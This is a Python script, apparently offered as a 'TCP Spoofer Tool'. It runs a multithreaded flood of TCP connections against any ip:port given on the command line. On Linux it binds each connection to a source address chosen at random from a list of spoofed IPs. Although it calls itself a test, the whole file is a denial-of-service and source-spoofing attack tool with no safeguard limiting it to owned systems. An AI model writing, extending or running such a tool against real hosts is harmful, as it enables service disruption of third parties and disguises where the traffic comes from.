import argparse
import os
import socket
import threading
import random
import sys

def send_tcp_request(ip, port, packets, spoofed_ips):
    for _ in range(packets):
        try:
            # Randomly select a spoofed IP
            spoofed_ip = random.choice(spoofed_ips)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            # Bind to the spoofed IP if on Linux, skip on Windows
            if os.name != 'nt':
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_TRANSPARENT, 1)  # Set socket option for spoofing
                sock.bind((spoofed_ip, 0))  # Bind to the spoofed IP
            
            sock.connect((ip, port))
            print(f"Connected to {ip}:{port} using Spoofed IP {spoofed_ip}")
            sock.close()
        except Exception as e:
            print(f"Failed to connect to {ip}:{port} using Spoofed IP {spoofed_ip}: {e}")


def run_threads(ip, port, packets, threads, spoofed_ips):
    thread_list = []

    for _ in range(threads):
        thread = threading.Thread(target=send_tcp_request, args=(ip, port, packets, spoofed_ips))
        thread_list.append(thread)
        thread.start()

    for thread in thread_list:
        thread.join()

def tcp_spoof_test(target, spoof_file, packets, threads):
    try:
        ip, port = target.split(':')
        port = int(port)
    except ValueError:
        print("Invalid target format. Use <ip:port>.")
        sys.exit(1)

    # Load spoofed IPs from file
    if not os.path.exists(spoof_file):
        print(f"File not found: {spoof_file}")
        sys.exit(1)

    with open(spoof_file, 'r') as f:
        spoofed_ips = [line.strip() for line in f.readlines()]

    if not spoofed_ips:
        print("No spoofed IPs found in the file.")
        sys.exit(1)

    print(f"Starting TCP Spoof test to {ip}:{port} with {threads} threads and {packets} packets per thread.")
    run_threads(ip, port, packets, threads, spoofed_ips)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="TCP Spoofer Tool")
    parser.add_argument("target", help="Target in the format <ip:port>")
    parser.add_argument("spoof_file", help="File containing spoofed IPs (one per line)")
    parser.add_argument("packets", type=int, help="Number of packets per thread")
    parser.add_argument("threads", type=int, help="Number of threads to run")

    args = parser.parse_args()

    tcp_spoof_test(args.target, args.spoof_file, args.packets, args.threads)
